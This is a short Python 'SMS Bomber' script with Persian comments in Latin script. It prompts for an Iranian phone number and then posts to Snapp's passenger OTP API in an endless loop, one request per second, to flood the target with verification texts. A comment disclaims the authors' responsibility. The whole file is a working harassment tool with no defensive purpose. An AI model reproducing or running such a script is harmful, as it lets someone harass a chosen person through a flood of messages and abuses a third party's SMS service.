import requests
import time
### print avalie RYZEN
print (".")
print (".")
print (".")
print (".")
print (".")
print (".")
print (".")
print (".")
print (".")
print (".")
print ("SMS Bomber By Ryzen")
print (".")
print (".")
print (".")
print (".")
print (".")

### NOTICE
Enter = input("shomare shakhs morede nazar ro bedon 0 vared kon :")

### Print Edame
print ("darhale ejraye sms bomber ...")
print ("baraye tavaghof az CMD kharej shavid")


### Tamamie SmS ha Az server Snapp Be Target Ersal Mishe Va Team (Iran Ray) hich Masooliati Ghabool Nemikonad
### ASLE Kar
while True:
    url ="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    number = {"cellphone":"+98"+Enter}
    sms = requests.post(url,data=number)
    print=(sms.status_code)
    time.sleep(1)